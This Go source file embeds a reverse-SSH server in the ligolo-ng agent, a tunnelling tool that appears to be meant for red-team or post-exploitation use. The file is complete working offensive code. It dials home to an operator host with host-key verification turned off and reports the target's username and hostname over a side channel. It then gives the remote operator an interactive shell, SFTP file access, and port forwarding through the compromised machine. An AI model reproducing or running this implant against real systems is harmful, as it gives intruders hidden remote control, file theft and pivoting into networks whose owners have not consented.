// Package rssh embeds a reverse-SSH server (derived from reverseSSH by Ferdinor)
// into the ligolo-ng agent. The SSH server runs as an independent goroutine
// alongside the ligolo tunnel.
package rssh

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/user"
	"strings"
	"sync"

	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

// Config holds the runtime configuration for the embedded SSH server.
type Config struct {
	Password      string
	AuthorizedKey string
	Shell         string
	Port          uint
	LHost         string
	LUser         string
	BPort         uint
	NoShell       bool
}

var (
	activeMu       sync.Mutex
	activeListener net.Listener

	// hostKey is generated once per agent run and reused across rssh_start calls
	// so the SSH host fingerprint stays stable within a session.
	hostKey ssh.Signer
)

func init() {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		log.Printf("[rssh] warning: could not generate host key: %v", err)
		return
	}
	signer, err := gossh.NewSignerFromKey(key)
	if err != nil {
		log.Printf("[rssh] warning: could not create signer: %v", err)
		return
	}
	hostKey = signer
}

// Listen binds (or, in reverse mode, dials home and gets a remote listener)
// without accepting connections. Returns an error if rssh is already running
// or the bind/dial fails. Must be paired with a call to Serve.
func Listen(cfg Config) (net.Listener, *ssh.Server, error) {
	activeMu.Lock()
	defer activeMu.Unlock()

	if activeListener != nil {
		return nil, nil, errors.New("rssh already running; use rssh_stop first")
	}

	server := buildServer(cfg)

	var (
		ln  net.Listener
		err error
	)
	if cfg.LHost == "" {
		addr := fmt.Sprintf(":%d", cfg.Port)
		log.Printf("[rssh] Binding on %s", addr)
		ln, err = net.Listen("tcp", addr)
	} else {
		target := net.JoinHostPort(cfg.LHost, fmt.Sprintf("%d", cfg.Port))
		log.Printf("[rssh] Dialling home via ssh to %s", target)
		ln, err = dialHomeAndListen(cfg.LUser, target, cfg.BPort, cfg.Password)
	}
	if err != nil {
		return nil, nil, err
	}

	activeListener = ln
	log.Printf("[rssh] Listening on %s", ln.Addr())
	return ln, server, nil
}

// Serve accepts connections on ln until it is closed. Clears the active
// listener state when done. Recovers from panics. Returns nil when the
// listener was closed intentionally (e.g. via Stop).
func Serve(ln net.Listener, server *ssh.Server) (err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("panic: %v", r)
			log.Printf("[rssh] recovered from panic: %v", r)
		}
		// "use of closed network connection" is the normal error when Stop()
		// closes the listener — treat it as a clean shutdown.
		if err != nil && strings.Contains(err.Error(), "use of closed network connection") {
			err = nil
		}
		activeMu.Lock()
		if activeListener == ln {
			activeListener = nil
		}
		activeMu.Unlock()
	}()
	return server.Serve(ln)
}

// Stop closes the active listener, terminating Serve.
func Stop() error {
	activeMu.Lock()
	defer activeMu.Unlock()
	if activeListener == nil {
		return errors.New("rssh not running")
	}
	err := activeListener.Close()
	activeListener = nil
	return err
}

// IsRunning reports whether the SSH server is currently active.
func IsRunning() bool {
	activeMu.Lock()
	defer activeMu.Unlock()
	return activeListener != nil
}

func buildServer(cfg Config) *ssh.Server {
	fwd := &ssh.ForwardedTCPHandler{}
	server := &ssh.Server{
		Handler:                       sessionHandler(cfg.Shell),
		PasswordHandler:               passwordHandler(cfg.Password),
		PublicKeyHandler:              pubkeyHandler(cfg.AuthorizedKey),
		LocalPortForwardingCallback:   localFwdCallback(cfg.NoShell),
		ReversePortForwardingCallback: reverseFwdCallback(),
		SessionRequestCallback:        sessionRequestCallback(cfg.NoShell),
		ChannelHandlers: map[string]ssh.ChannelHandler{
			"direct-tcpip": ssh.DirectTCPIPHandler,
			"session":      ssh.DefaultSessionHandler,
			"rs-info":      extraInfoHandler(),
		},
		RequestHandlers: map[string]ssh.RequestHandler{
			"tcpip-forward":        fwd.HandleSSHRequest,
			"cancel-tcpip-forward": fwd.HandleSSHRequest,
		},
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": sftpHandler(),
		},
	}
	if hostKey != nil {
		server.HostSigners = []ssh.Signer{hostKey}
	}
	return server
}

func dialHomeAndListen(username, address string, bport uint, password string) (net.Listener, error) {
	cfg := &gossh.ClientConfig{
		User:            username,
		Auth:            []gossh.AuthMethod{gossh.Password(password)},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
	}

	var (
		client *gossh.Client
		err    error
	)
	for {
		client, err = gossh.Dial("tcp", address, cfg)
		if err == nil {
			break
		}
		if strings.Contains(err.Error(), "no supported methods remain") {
			fmt.Println("[rssh] Enter password:")
			data, readErr := term.ReadPassword(int(os.Stdin.Fd()))
			if readErr != nil {
				log.Println("[rssh]", readErr)
				continue
			}
			cfg.Auth = []gossh.AuthMethod{gossh.Password(string(data))}
		} else {
			return nil, err
		}
	}

	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", bport))
	if err != nil {
		return nil, err
	}
	log.Printf("[rssh] Success: listening at home on %s", ln.Addr())
	sendExtraInfo(client, ln.Addr().String())
	return ln, nil
}

type ExtraInfo struct {
	CurrentUser      string
	Hostname         string
	ListeningAddress string
}

func sendExtraInfo(client *gossh.Client, listeningAddress string) {
	info := ExtraInfo{ListeningAddress: listeningAddress}
	if u, err := user.Current(); err == nil {
		info.CurrentUser = u.Username
	} else {
		info.CurrentUser = "ERROR"
	}
	if h, err := os.Hostname(); err == nil {
		info.Hostname = h
	} else {
		info.Hostname = "ERROR"
	}
	newChan, newReq, err := client.OpenChannel("rs-info", gossh.Marshal(&info))
	if err != nil && !strings.Contains(err.Error(), "th4nkz") {
		log.Printf("[rssh] Could not create info channel: %v", err)
	}
	if err == nil {
		go gossh.DiscardRequests(newReq)
		newChan.Close()
	}
}

func localFwdCallback(forbidden bool) ssh.LocalPortForwardingCallback {
	return func(ctx ssh.Context, dhost string, dport uint32) bool {
		if forbidden {
			log.Printf("[rssh] Denying local port forwarding to %s:%d", dhost, dport)
			return false
		}
		log.Printf("[rssh] Accepted forward to %s:%d", dhost, dport)
		return true
	}
}

func reverseFwdCallback() ssh.ReversePortForwardingCallback {
	return func(ctx ssh.Context, host string, port uint32) bool {
		log.Printf("[rssh] Reverse bind at %s:%d granted", host, port)
		return true
	}
}

func sessionRequestCallback(forbidden bool) ssh.SessionRequestCallback {
	return func(sess ssh.Session, requestType string) bool {
		if forbidden {
			log.Println("[rssh] Denying shell/exec/subsystem request")
			return false
		}
		return true
	}
}

func passwordHandler(password string) ssh.PasswordHandler {
	return func(ctx ssh.Context, pass string) bool {
		ok := pass == password
		if ok {
			log.Printf("[rssh] Auth OK (password) from %s@%s", ctx.User(), ctx.RemoteAddr())
		} else {
			log.Printf("[rssh] Auth FAIL (password) from %s@%s", ctx.User(), ctx.RemoteAddr())
		}
		return ok
	}
}

func pubkeyHandler(authorizedKey string) ssh.PublicKeyHandler {
	if authorizedKey == "" {
		return nil
	}
	return func(ctx ssh.Context, key ssh.PublicKey) bool {
		master, _, _, _, err := ssh.ParseAuthorizedKey([]byte(authorizedKey))
		if err != nil {
			log.Println("[rssh] Error parsing public key:", err)
			return false
		}
		ok := bytes.Equal(key.Marshal(), master.Marshal())
		if ok {
			log.Printf("[rssh] Auth OK (pubkey) from %s@%s", ctx.User(), ctx.RemoteAddr())
		} else {
			log.Printf("[rssh] Auth FAIL (pubkey) from %s@%s", ctx.User(), ctx.RemoteAddr())
		}
		return ok
	}
}

func sftpHandler() ssh.SubsystemHandler {
	return func(s ssh.Session) {
		srv, err := sftp.NewServer(s)
		if err != nil {
			log.Printf("[rssh] SFTP init error: %v", err)
			return
		}
		log.Printf("[rssh] SFTP connection from %s", s.RemoteAddr())
		if err := srv.Serve(); err == io.EOF {
			srv.Close()
		} else if err != nil {
			log.Println("[rssh] SFTP error:", err)
		}
	}
}

func extraInfoHandler() ssh.ChannelHandler {
	return func(srv *ssh.Server, conn *gossh.ServerConn, newChan gossh.NewChannel, ctx ssh.Context) {
		var info ExtraInfo
		err := gossh.Unmarshal(newChan.ExtraData(), &info)
		newChan.Reject(gossh.Prohibited, "th4nkz")
		if err != nil {
			log.Printf("[rssh] Could not parse extra info from %s", conn.RemoteAddr())
			return
		}
		log.Printf("[rssh] Connection from %s: %s on %s reachable via %s",
			conn.RemoteAddr(), info.CurrentUser, info.Hostname, info.ListeningAddress)
	}
}
